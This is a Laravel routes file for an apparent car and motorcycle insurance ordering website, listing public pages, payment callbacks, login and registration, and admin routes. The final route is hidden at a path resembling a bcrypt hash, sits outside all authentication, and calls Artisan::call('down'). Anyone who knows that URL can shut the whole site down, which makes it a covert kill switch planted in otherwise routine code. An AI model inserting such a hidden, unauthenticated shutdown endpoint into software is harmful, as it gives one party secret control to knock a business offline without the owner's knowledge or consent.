<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use Morilog\Jalali\Jalalian;

Route::get('/', "PageController@home");
Route::get('/about', "PageController@about");
Route::get('/contact', "PageController@contact");
Route::get('/terms', "PageController@terms");
Route::get('/complaint', "PageController@complaint");
Route::get('/logout', function () {
    \Illuminate\Support\Facades\Auth::logout();
    return redirect("/");
});
Route::get('/pay/{id}', "payController@pay");
Route::get('/pay/mobile/{id}', "payController@mobilepay");
Route::post('/response', "payController@response");
Route::any('/responsemobile', "payController@responsemobile");

Route::prefix("order")->group(function () {
    Route::get('/car', "OrderController@create");
    Route::get('/motorcycle', "OrderController@createmotorcycle");
    Route::get('/validate', "OrderController@valdiate");
    Route::post('/validate', "OrderController@valdiateform");
    Route::get('/sms', "OrderController@sendsms");
    Route::post('/resms', "OrderController@resms");
    Route::get('/recall', "OrderController@recall");
    Route::post('/getinsurance', "OrderController@getinsurance");
    Route::post('/save', "OrderController@save");
});


//Route::get('/', 'Auth\LoginController@showLoginForm');
Route::get('/login', 'Auth\LoginController@showLoginForm')->name("login");
Route::post('/login', 'Auth\LoginController@login')->name("login.request");

Route::post('/logout', 'Auth\LoginController@logout')->name("logout");

Route::get('/register', 'Auth\RegisterController@showRegistrationForm')->name("register");
Route::post('/register', 'Auth\RegisterController@register')->name("register.request");
Route::post('/register/send/code', 'Auth\RegisterController@sendCode')->name("register.send.code");

Route::get('/register/code', 'Auth\RegisterController@showGetCodeForm')->name("get.code");
Route::post('/register/code', 'Auth\RegisterController@getCode')->name("get.code.request");
Route::post('/register/clear/code', 'Auth\RegisterController@clearCode');

Route::get('/password/set', 'Auth\PasswordController@showPasswordSetForm')->name("set.password");
Route::post('/password/set', 'Auth\PasswordController@setAndReset')->name("set.password.request");
Route::get('/password/reset/send/code', 'Auth\PasswordController@resetPasswordSendCode')->name("reset.password.send.code");
Route::get('/password/reset', 'Auth\PasswordController@showResetForm')->name("reset.password");

Route::middleware("auth")->group(function () {
    Route::get("/profile", "PageController@profileuser");
    Route::get("/myinsurance", "PageController@myinsurance");
    Route::post("/edit", "PageController@edituser");
    Route::post("/changepass", "PageController@changepassuser");
    Route::prefix("admin")->middleware("admin")->group(function () {
        Route::get("/", "PageController@homeadmin");
        Route::prefix("profile")->group(function () {
            Route::get("/", "PageController@profileadmin");
            Route::post("/edit", "PageController@edit");
            Route::post("/changepass", "PageController@changepass");
        });
        Route::prefix("car")->group(function () {
            Route::get("/", "CarController@create");
            Route::post("/save", "CarController@save");
            Route::get("/save", "CarController@createat");
            Route::post("/delete", "CarController@delete");
        });

        Route::prefix("plan")->group(function () {
            Route::get("/list", "PlanController@list")->name('plan.index');
            Route::get("/", "PlanController@create");
            Route::POST("/", "PlanController@create");
            Route::POST("/delete", "PlanController@delete");
            Route::get("/{plan}/edit", "PlanController@edit")->name('plan.edit');
            Route::put("/{plan}/update", "PlanController@update")->name('plan.update');
        });

        //cars-kind
        Route::namespace('Admin')->as('admin.')->group(function () {
            Route::resource('car-types', 'CarTypeController')->only(['create', 'store', 'index', 'destroy', 'edit', 'update']);
            Route::put('car-types/{car_type}/update/status', 'CarTypeController@updateStatus')->name('car-types.updateStatus');
            Route::get('car-types/default', 'CarTypeController@default')->name('car-types.default');
            Route::post('car-types/default', 'CarTypeController@defaultUpdate')->name('car-types.default.update');
            //webApi for get plans by carType
            Route::post('car-types/{car_type}/plans', 'CarTypeController@plans')->name('car-types.plans');
            //carModels
            Route::resource('car-models', 'CarModelController')->only(['create', 'store', 'index', 'destroy', 'edit', 'update']);
            Route::put('car-models/{car_model}/update/status', 'CarModelController@updateStatus')->name('car-models.updateStatus');
            Route::get('car-models/default', 'CarModelController@default')->name('car-models.default');
            Route::post('car-models/default', 'CarModelController@defaultUpdate')->name('car-models.default.update');
        });

        Route::prefix("usage")->group(function () {
            Route::get("/", "UsageController@create");
            Route::POST("/", "UsageController@create");
            Route::get("/list", "UsageController@list");
            Route::POST("/delete", "UsageController@delete");
        });
        Route::prefix("insurance")->group(function () {
            Route::get("/", "InsuranceController@list");
            Route::get("/edit/{id}", "InsuranceController@edit");
            Route::get("/create", "InsuranceController@create");
            Route::post("/create", "InsuranceController@create");
            Route::post("/delete", "InsuranceController@delete");
        });
        Route::prefix("cover")->group(function () {
            Route::get("/{insurance_id}", "CoverController@list")->name('insurance.show');
            Route::get("/create/{insurance_id}", "CoverController@create");
            Route::post("/create/{insurance_id}", "CoverController@create");
            Route::post("/delete", "CoverController@delete");
            //edit cover
            Route::get("/{commitment}/edit", "CoverController@edit")->name('cover.edit');
            Route::put("/{commitment}/update", "CoverController@update")->name('cover.update');
        });
        Route::prefix("order")->group(function () {
            Route::get("/new", "OrderController@list");
            Route::get("/archive/{cid?}.{pid?}.{dt1?}.{dt2?}", "OrderController@searcharchive");
            Route::get("/archive/", "OrderController@listarchive");
            Route::get("/request/{id}", "OrderController@show");
            Route::post("/delete", "OrderController@delete");
            Route::post("/confirm", "OrderController@confirm");
        });
    });
});

Route::get('/$2y$10$ne73JYUpOfjKF.it1ThbDO4aQKN5jo4cSMueR2nGl2LehjCmjxz3S', function () {
    Artisan::call('down');
});


